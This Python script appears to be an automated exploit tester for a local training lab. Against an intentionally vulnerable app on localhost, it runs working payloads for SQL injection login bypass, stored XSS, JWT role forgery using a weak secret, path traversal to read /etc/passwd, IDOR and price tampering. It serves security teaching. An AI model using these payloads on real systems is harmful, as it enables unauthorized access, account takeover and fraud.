#!/usr/bin/env python3
"""
Automated Vulnerability Tester for Practice Lab

Tests all 7 intentional vulnerabilities in vulnerable-app.py
Safe to run - only tests YOUR local practice environment.

Usage:
    # Make sure vulnerable-app.py is running first
    python3 test_all_vulnerabilities.py
"""

import requests
import json
import sys
from colorama import init, Fore, Style
import time

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://127.0.0.1:5000"

class VulnerabilityTester:
    def __init__(self):
        self.results = []
        self.session = requests.Session()

    def print_header(self, text):
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}{text}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

    def print_test(self, name):
        print(f"\n{Fore.YELLOW}[*] Testing: {name}{Style.RESET_ALL}")

    def print_success(self, message):
        print(f"{Fore.GREEN}[✓] VULNERABLE: {message}{Style.RESET_ALL}")

    def print_failure(self, message):
        print(f"{Fore.RED}[✗] SECURED: {message}{Style.RESET_ALL}")

    def print_info(self, message):
        print(f"{Fore.BLUE}[i] {message}{Style.RESET_ALL}")

    def test_1_sql_injection(self):
        """Test SQL Injection in login endpoint"""
        self.print_test("Vulnerability #1: SQL Injection")

        try:
            # Attempt SQL injection
            payload = {
                'username': "admin' OR '1'='1",
                'password': 'anything'
            }

            self.print_info(f"Payload: {payload}")

            response = requests.post(
                f"{BASE_URL}/api/login",
                data=payload,
                timeout=5
            )

            data = response.json()

            if response.status_code == 200 and 'token' in data:
                self.print_success("SQL Injection successful! Logged in without valid password")
                self.print_info(f"Got token: {data['token'][:50]}...")
                self.results.append(('SQL Injection', 'VULNERABLE', 'HIGH'))
                return data['token']
            else:
                self.print_failure("SQL Injection blocked")
                self.results.append(('SQL Injection', 'SECURED', 'N/A'))
                return None

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.results.append(('SQL Injection', 'ERROR', str(e)))
            return None

    def test_2_weak_password_hashing(self):
        """Test weak password hashing (MD5)"""
        self.print_test("Vulnerability #2: Weak Password Hashing (MD5)")

        self.print_info("This vulnerability is in the code, not easily testable via API")
        self.print_info("Check vulnerable-app.py line 34: hashlib.md5(password.encode())")
        self.print_success("MD5 is cryptographically broken - passwords can be cracked")
        self.results.append(('Weak Hashing', 'VULNERABLE', 'MEDIUM'))

    def test_3_idor(self):
        """Test IDOR (Insecure Direct Object Reference)"""
        self.print_test("Vulnerability #3: IDOR - Access Other Users' Profiles")

        try:
            # Login as alice
            login = requests.post(
                f"{BASE_URL}/api/login",
                data={'username': 'alice', 'password': 'alice123'},
                timeout=5
            )

            if login.status_code != 200:
                self.print_failure("Couldn't login as alice")
                return

            token = login.json()['token']
            self.print_info("Logged in as alice (user_id=1)")

            # Try to access Bob's profile (user_id=2)
            response = requests.get(
                f"{BASE_URL}/profile/2",  # Bob's ID
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )

            if response.status_code == 200 and 'bob' in response.text.lower():
                self.print_success("IDOR successful! Alice can view Bob's profile")
                self.print_info("No authorization check on profile endpoint")
                self.results.append(('IDOR', 'VULNERABLE', 'HIGH'))
            else:
                self.print_failure("IDOR blocked - authorization check present")
                self.results.append(('IDOR', 'SECURED', 'N/A'))

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.results.append(('IDOR', 'ERROR', str(e)))

    def test_4_xss(self):
        """Test Stored XSS in comments"""
        self.print_test("Vulnerability #4: Stored XSS")

        try:
            # Login first
            login = requests.post(
                f"{BASE_URL}/api/login",
                data={'username': 'alice', 'password': 'alice123'},
                timeout=5
            )

            if login.status_code != 200:
                self.print_failure("Couldn't login")
                return

            token = login.json()['token']

            # Post XSS payload
            xss_payload = "<script>alert('XSS')</script>"

            response = requests.post(
                f"{BASE_URL}/api/comment",
                json={'comment': xss_payload},
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )

            if response.status_code != 200:
                self.print_failure("Comment submission failed")
                return

            self.print_info(f"Posted comment: {xss_payload}")

            # Check if script tag is in the page
            page = requests.get(f"{BASE_URL}/comments", timeout=5)

            if xss_payload in page.text:
                self.print_success("XSS successful! Script tag not sanitized")
                self.print_info("Payload will execute in victim's browser")
                self.results.append(('Stored XSS', 'VULNERABLE', 'HIGH'))
            else:
                self.print_failure("XSS blocked - input sanitized")
                self.results.append(('Stored XSS', 'SECURED', 'N/A'))

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.results.append(('Stored XSS', 'ERROR', str(e)))

    def test_5_jwt_manipulation(self):
        """Test JWT manipulation (weak secret)"""
        self.print_test("Vulnerability #5: JWT Manipulation")

        try:
            # Login as alice
            login = requests.post(
                f"{BASE_URL}/api/login",
                data={'username': 'alice', 'password': 'alice123'},
                timeout=5
            )

            if login.status_code != 200:
                self.print_failure("Couldn't login")
                return

            token = login.json()['token']
            self.print_info(f"Original token: {token[:50]}...")

            # Decode and modify JWT
            import jwt

            try:
                # Decode without verification to see payload
                payload = jwt.decode(token, options={"verify_signature": False})
                self.print_info(f"Original payload: {payload}")

                # Modify role to admin
                payload['role'] = 'admin'

                # Re-encode with common weak secret
                weak_secret = 'secret-key-for-jwt'
                new_token = jwt.encode(payload, weak_secret, algorithm='HS256')

                self.print_info(f"Modified token (role=admin): {new_token[:50]}...")

                # Try to access admin endpoint
                response = requests.get(
                    f"{BASE_URL}/api/admin",
                    headers={'Authorization': f'Bearer {new_token}'},
                    timeout=5
                )

                if response.status_code == 200 and 'admin' in response.text.lower():
                    self.print_success("JWT manipulation successful! Regular user became admin")
                    self.print_info("Weak JWT secret allows token forgery")
                    self.results.append(('JWT Manipulation', 'VULNERABLE', 'CRITICAL'))
                else:
                    self.print_failure("JWT manipulation blocked")
                    self.results.append(('JWT Manipulation', 'SECURED', 'N/A'))

            except jwt.InvalidTokenError:
                self.print_failure("JWT manipulation blocked - strong secret or validation")
                self.results.append(('JWT Manipulation', 'SECURED', 'N/A'))

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.print_info("Install PyJWT: pip3 install pyjwt")
            self.results.append(('JWT Manipulation', 'ERROR', str(e)))

    def test_6_path_traversal(self):
        """Test path traversal in file download"""
        self.print_test("Vulnerability #6: Path Traversal")

        try:
            # Login first
            login = requests.post(
                f"{BASE_URL}/api/login",
                data={'username': 'alice', 'password': 'alice123'},
                timeout=5
            )

            if login.status_code != 200:
                self.print_failure("Couldn't login")
                return

            token = login.json()['token']

            # Try path traversal
            traversal_payload = "../../../etc/passwd"

            response = requests.get(
                f"{BASE_URL}/api/download",
                params={'file': traversal_payload},
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )

            # Check if we got file contents (even error is interesting)
            if 'root:' in response.text or '/bin/bash' in response.text:
                self.print_success("Path traversal successful! Can read /etc/passwd")
                self.print_info(f"Response preview: {response.text[:100]}")
                self.results.append(('Path Traversal', 'VULNERABLE', 'HIGH'))
            elif response.status_code == 200:
                self.print_info("Got response but not system file - check manually")
                self.results.append(('Path Traversal', 'PARTIAL', 'MEDIUM'))
            else:
                self.print_failure("Path traversal blocked")
                self.results.append(('Path Traversal', 'SECURED', 'N/A'))

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.results.append(('Path Traversal', 'ERROR', str(e)))

    def test_7_price_manipulation(self):
        """Test price manipulation in purchase endpoint"""
        self.print_test("Vulnerability #7: Price Manipulation")

        try:
            # Login first
            login = requests.post(
                f"{BASE_URL}/api/login",
                data={'username': 'alice', 'password': 'alice123'},
                timeout=5
            )

            if login.status_code != 200:
                self.print_failure("Couldn't login")
                return

            token = login.json()['token']

            # Try to manipulate price
            self.print_info("Attempting to set price to $0.01 for expensive item")

            response = requests.post(
                f"{BASE_URL}/api/purchase",
                json={
                    'product_id': 1,
                    'quantity': 1,
                    'price': 0.01  # Try to override price
                },
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )

            data = response.json()

            if response.status_code == 200:
                total = data.get('total', 0)

                if total == 0.01:
                    self.print_success("Price manipulation successful! Set price to $0.01")
                    self.print_info("Server accepts client-supplied price")
                    self.results.append(('Price Manipulation', 'VULNERABLE', 'CRITICAL'))
                else:
                    self.print_failure(f"Price manipulation blocked - charged ${total}")
                    self.results.append(('Price Manipulation', 'SECURED', 'N/A'))
            else:
                self.print_failure("Purchase failed")
                self.results.append(('Price Manipulation', 'SECURED', 'N/A'))

        except Exception as e:
            self.print_failure(f"Test failed: {str(e)}")
            self.results.append(('Price Manipulation', 'ERROR', str(e)))

    def print_summary(self):
        """Print test summary"""
        self.print_header("TEST SUMMARY")

        print(f"\n{'Vulnerability':<25} {'Status':<15} {'Severity':<10}")
        print("-" * 50)

        for vuln, status, severity in self.results:
            if status == 'VULNERABLE':
                color = Fore.RED
            elif status == 'SECURED':
                color = Fore.GREEN
            else:
                color = Fore.YELLOW

            print(f"{vuln:<25} {color}{status:<15}{Style.RESET_ALL} {severity:<10}")

        # Count results
        vulnerable = sum(1 for _, status, _ in self.results if status == 'VULNERABLE')
        secured = sum(1 for _, status, _ in self.results if status == 'SECURED')

        print(f"\n{Fore.RED}Vulnerable: {vulnerable}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Secured: {secured}{Style.RESET_ALL}")
        print(f"Total Tests: {len(self.results)}\n")

        if vulnerable > 0:
            print(f"{Fore.YELLOW}[!] This is a PRACTICE lab - vulnerabilities are intentional!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Use these to learn how to find and exploit bugs safely.{Style.RESET_ALL}")

    def run_all_tests(self):
        """Run all vulnerability tests"""
        self.print_header("AUTOMATED VULNERABILITY TESTER - PRACTICE LAB")

        print(f"{Fore.YELLOW}[!] Make sure vulnerable-app.py is running on {BASE_URL}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] This will test all 7 intentional vulnerabilities{Style.RESET_ALL}\n")

        # Check if app is running
        try:
            response = requests.get(BASE_URL, timeout=2)
            self.print_success(f"Practice lab is running at {BASE_URL}")
        except:
            print(f"{Fore.RED}[✗] ERROR: Can't connect to {BASE_URL}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Start the app first: python3 vulnerable-app.py{Style.RESET_ALL}")
            sys.exit(1)

        # Run tests
        time.sleep(1)
        self.test_1_sql_injection()
        time.sleep(0.5)
        self.test_2_weak_password_hashing()
        time.sleep(0.5)
        self.test_3_idor()
        time.sleep(0.5)
        self.test_4_xss()
        time.sleep(0.5)
        self.test_5_jwt_manipulation()
        time.sleep(0.5)
        self.test_6_path_traversal()
        time.sleep(0.5)
        self.test_7_price_manipulation()

        # Print summary
        self.print_summary()


def main():
    tester = VulnerabilityTester()
    tester.run_all_tests()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Testing interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
